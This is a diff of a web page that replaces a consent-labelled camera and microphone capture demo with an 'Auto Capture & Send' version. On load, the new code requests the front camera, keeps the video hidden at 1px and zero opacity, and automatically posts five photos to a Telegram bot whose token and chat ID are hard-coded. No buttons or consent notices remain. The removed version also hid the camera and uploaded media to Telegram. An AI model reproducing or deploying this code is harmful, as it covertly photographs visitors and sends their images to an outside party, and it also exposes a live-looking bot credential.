@@ -1,321 +1,113 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Camera + Microphone Capture (Consent Required)</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 20px;
-      background-color: #f0f0f0;
-    }
-    .container {
-      max-width: 600px;
-      margin: 0 auto;
-      background: white;
-      border-radius: 10px;
-      padding: 20px;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Capture & Send (5 Photos)</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background: #f0f0f0;
+        }
+        #status {
+            font-weight: bold;
+            padding: 10px;
+            background: #fff;
+            display: inline-block;
+            border-radius: 6px;
+            box-shadow: 0 0 6px rgba(0,0,0,0.2);
+        }
 
-    /* Camera stream fully hidden */
-    video, #video {
-      position: absolute !important;
-      width: 1px !important;
-      height: 1px !important;
-      opacity: 0 !important;
-      pointer-events: none !important;
-    }
-
-    /* Keep preview hidden */
-    .preview-image { display: none !important; }
-
-    button {
-      background-color: #4CAF50;
-      border: none;
-      color: white;
-      padding: 12px 18px;
-      margin: 8px;
-      font-size: 14px;
-      border-radius: 6px;
-      cursor: pointer;
-    }
-    button.secondary { background-color: #2196F3; }
-    button.warn { background-color: #f44336; }
-
-    button:disabled { opacity: 0.6; cursor: not-allowed; }
-
-    #status, #recordStatus {
-      margin-top: 12px;
-      font-weight: bold;
-      min-height: 22px;
-    }
-
-    /* Visible recording indicator - must be obvious */
-    .recording-indicator {
-      display: inline-block;
-      width: 10px;
-      height: 10px;
-      margin-right: 8px;
-      border-radius: 50%;
-      background: red;
-      vertical-align: middle;
-      animation: pulse 1s infinite;
-    }
-    @keyframes pulse {
-      0% { opacity: 1; transform: scale(1); }
-      50% { opacity: 0.4; transform: scale(1.4); }
-      100% { opacity: 1; transform: scale(1); }
-    }
-
-    .controls { margin-top: 14px; }
-  </style>
+        /* Hide video completely */
+        video {
+            position: absolute !important;
+            width: 1px !important;
+            height: 1px !important;
+            opacity: 0 !important;
+            pointer-events: none !important;
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Camera + Microphone Capture</h1>
-    <p><strong>Note:</strong> Microphone recording is visible when active. Use only with consent.</p>
 
-    <div class="preview-container">
-      <video id="video" autoplay playsinline></video>
-      <img id="preview" class="preview-image" alt="Preview">
-    </div>
+    <h2>Auto Camera Capture (5 Photos)</h2>
+    <div id="status">Waiting for camera permission...</div>
 
-    <div class="controls">
-      <button id="captureBtn">Capture Photo</button>
-      <button id="sendBtn" disabled>Send Photo to Telegram</button>
-    </div>
+    <video id="video" autoplay playsinline></video>
 
-    <hr />
+    <script>
+        const TELEGRAM_BOT_TOKEN = "8514639816:AAGF8rmIqRwZIkjM0ehndHOd1RWBRZYpOj0";  // ⬅ replace
+        const TELEGRAM_CHAT_ID = "5741929254";      // ⬅ replace
+        const CAPTURE_COUNT = 5; // Number of photos
+        const CAPTURE_INTERVAL = 1000; // 1 second
 
-    <!-- Microphone controls -->
-    <div class="controls">
-      <button id="startRecBtn" class="secondary">Start Recording (Mic)</button>
-      <button id="stopRecBtn" class="warn" disabled>Stop & Send Recording</button>
-    </div>
+        const video = document.getElementById("video");
+        const statusDiv = document.getElementById("status");
+        const canvas = document.createElement("canvas");
+        const ctx = canvas.getContext("2d");
 
-    <!-- Visible recording notice -->
-    <div id="recordStatus" aria-live="polite"></div>
+        let stream = null;
+        let captured = 0;
 
-    <div id="status">Ready to access camera & mic (consent required).</div>
-  </div>
+        async function startCamera() {
+            try {
+                statusDiv.textContent = "Accessing camera...";
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
 
-  <script>
-    // ---------- CONFIG ----------
-    const TELEGRAM_BOT_TOKEN = '8514639816:AAGF8rmIqRwZIkjM0ehndHOd1RWBRZYpOj0'; // <-- replace or use backend
-    const TELEGRAM_CHAT_ID  = '5741929254';   // <-- replace or use backend
-    // ----------------------------
-
-    // Camera elements & canvas (camera stays hidden)
-    const video = document.getElementById('video');
-    const preview = document.getElementById('preview');
-    const captureBtn = document.getElementById('captureBtn');
-    const sendBtn = document.getElementById('sendBtn');
-    const statusDiv = document.getElementById('status');
-
-    const canvas = document.createElement('canvas');
-    const ctx = canvas.getContext('2d');
-
-    // Microphone elements & state
-    const startRecBtn = document.getElementById('startRecBtn');
-    const stopRecBtn = document.getElementById('stopRecBtn');
-    const recordStatusDiv = document.getElementById('recordStatus');
-
-    let camStream = null;
-    let micStream = null;
-    let mediaRecorder = null;
-    let audioChunks = [];
-
-    // -------- CAMERA (hidden) ----------
-    async function initCamera() {
-      try {
-        statusDiv.textContent = 'Accessing camera...';
-        camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        video.srcObject = camStream;
-        statusDiv.textContent = 'Camera ready (hidden).';
-        captureBtn.disabled = false;
-      } catch (err) {
-        console.error('Camera error:', err);
-        statusDiv.textContent = 'Error: Could not access camera. Check permissions.';
-        captureBtn.disabled = true;
-      }
-    }
-
-    function captureImage() {
-      // ensure video metadata loaded
-      const vw = video.videoWidth || 640;
-      const vh = video.videoHeight || 480;
-      canvas.width = vw;
-      canvas.height = vh;
-      ctx.drawImage(video, 0, 0, vw, vh);
-
-      // Do not show preview (hidden by CSS)
-      // preview.src = canvas.toDataURL('image/png');
-      // preview.style.display = 'block';
-
-      statusDiv.textContent = 'Photo captured (hidden). Click Send Photo to send.';
-      sendBtn.disabled = false;
-    }
-
-    async function sendPhotoToTelegram() {
-      try {
-        statusDiv.textContent = 'Sending photo to Telegram...';
-        sendBtn.disabled = true;
-
-        canvas.toBlob(async (blob) => {
-          const form = new FormData();
-          form.append('chat_id', TELEGRAM_CHAT_ID);
-          form.append('photo', blob, 'capture.png');
-
-          // NOTE: It's strongly recommended to send via your backend endpoint that holds the bot token.
-          const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: form
-          });
-
-          const resJson = await resp.json();
-          if (resJson.ok) {
-            statusDiv.textContent = 'Photo sent successfully!';
-            sendBtn.disabled = false;
-          } else {
-            throw new Error(resJson.description || 'Telegram error');
-          }
-        }, 'image/png');
-      } catch (err) {
-        console.error('Send photo error:', err);
-        statusDiv.textContent = 'Error sending photo: ' + err.message;
-        sendBtn.disabled = false;
-      }
-    }
-
-    // -------- MICROPHONE RECORDING (with visible notice) ----------
-    async function startMicRecording() {
-      try {
-        recordStatusDiv.innerHTML = ''; // clear
-        startRecBtn.disabled = true;
-        stopRecBtn.disabled = true;
-        statusDiv.textContent = 'Requesting microphone access...';
-
-        // Ask for mic access
-        micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        statusDiv.textContent = 'Microphone ready. Recording started.';
-        stopRecBtn.disabled = false;
-
-        // Show visible recording indicator and message (consent notice)
-        recordStatusDiv.innerHTML = '<span class="recording-indicator" aria-hidden="true"></span><span>Recording — Microphone is active (visible notice).</span>';
-
-        // Setup MediaRecorder
-        audioChunks = [];
-        mediaRecorder = new MediaRecorder(micStream);
-
-        mediaRecorder.ondataavailable = (e) => {
-          if (e.data && e.data.size > 0) audioChunks.push(e.data);
-        };
-
-        mediaRecorder.onstop = async () => {
-          // combine chunks into a single blob
-          const audioBlob = new Blob(audioChunks, { type: 'audio/webm' }); // webm/ogg depending on browser
-          // Optionally: auto-send audio here or wait for stop button handler
-          // We will send in stopRecBtn handler below.
-          // Stop mic tracks (privacy)
-          micStream.getTracks().forEach(t => t.stop());
-          micStream = null;
-        };
-
-        mediaRecorder.start();
-      } catch (err) {
-        console.error('Mic error:', err);
-        statusDiv.textContent = 'Error: Could not access microphone. Check permissions.';
-        startRecBtn.disabled = false;
-        stopRecBtn.disabled = true;
-        recordStatusDiv.innerHTML = '';
-      }
-    }
-
-    async function stopAndSendRecording() {
-      try {
-        stopRecBtn.disabled = true;
-        recordStatusDiv.innerHTML = ''; // hide indicator immediately or keep for a short time
-        statusDiv.textContent = 'Stopping recording...';
-
-        if (!mediaRecorder) {
-          statusDiv.textContent = 'No active recording.';
-          startRecBtn.disabled = false;
-          return;
+                statusDiv.textContent = "Camera started. Capturing images...";
+                setTimeout(autoCapture, 800);
+            } catch (err) {
+                statusDiv.textContent = "Camera access failed: " + err.message;
+            }
         }
 
-        // stop the recorder (this will trigger onstop and finalize chunks)
-        mediaRecorder.stop();
+        async function autoCapture() {
+            if (captured >= CAPTURE_COUNT) {
+                stopCamera();
+                statusDiv.textContent = "All photos captured and sent.";
+                return;
+            }
 
-        // wait a tick to ensure ondataavailable fired
-        await new Promise(resolve => setTimeout(resolve, 200));
+            captureAndSend();
+            captured++;
 
-        // Build blob from chunks
-        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+            statusDiv.textContent = `Captured ${captured}/${CAPTURE_COUNT} ...`;
 
-        // Send to Telegram (or forward to backend)
-        await sendAudioToTelegram(audioBlob);
-
-        // Reset UI
-        statusDiv.textContent = 'Recording sent.';
-        startRecBtn.disabled = false;
-        stopRecBtn.disabled = true;
-        audioChunks = [];
-        mediaRecorder = null;
-      } catch (err) {
-        console.error('Stop/send error:', err);
-        statusDiv.textContent = 'Error stopping or sending recording: ' + err.message;
-        startRecBtn.disabled = false;
-        stopRecBtn.disabled = true;
-      }
-    }
-
-    async function sendAudioToTelegram(blob) {
-      try {
-        statusDiv.textContent = 'Uploading audio to Telegram...';
-
-        const form = new FormData();
-        form.append('chat_id', TELEGRAM_CHAT_ID);
-        // For Telegram voice messages use field 'voice' with an OGG/OPUS file ideally.
-        // Many browsers produce webm; Telegram accepts OGG/WEBM/MP3 as well for sendAudio/sendVoice.
-        form.append('voice', blob, 'recording.webm');
-
-        const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, {
-          method: 'POST',
-          body: form
-        });
-
-        const resJson = await resp.json();
-        if (resJson.ok) {
-          statusDiv.textContent = 'Audio sent successfully!';
-        } else {
-          throw new Error(resJson.description || 'Telegram error');
+            setTimeout(autoCapture, CAPTURE_INTERVAL);
         }
-      } catch (err) {
-        console.error('Send audio error:', err);
-        statusDiv.textContent = 'Error sending audio: ' + err.message;
-      }
-    }
 
-    // ---------- Event wiring ----------
-    captureBtn.addEventListener('click', captureImage);
-    sendBtn.addEventListener('click', sendPhotoToTelegram);
+        function captureAndSend() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    startRecBtn.addEventListener('click', () => {
-      startRecBtn.disabled = true;
-      stopRecBtn.disabled = false;
-      startMicRecording();
-    });
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append("chat_id", TELEGRAM_CHAT_ID);
+                formData.append("photo", blob, `img_${Date.now()}.jpg`);
 
-    stopRecBtn.addEventListener('click', () => {
-      stopRecBtn.disabled = true;
-      stopAndSendRecording();
-    });
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: "POST",
+                        body: formData
+                    });
+                } catch (e) {
+                    console.error("Send error:", e);
+                }
+            }, "image/jpeg", 0.85);
+        }
 
-    // init camera on load (camera hidden)
-    window.addEventListener('load', initCamera);
-  </script>
+        function stopCamera() {
+            if (stream) {
+                stream.getTracks().forEach(t => t.stop());
+            }
+        }
+
+        window.onload = startCamera;
+    </script>
+
 </body>
 </html>
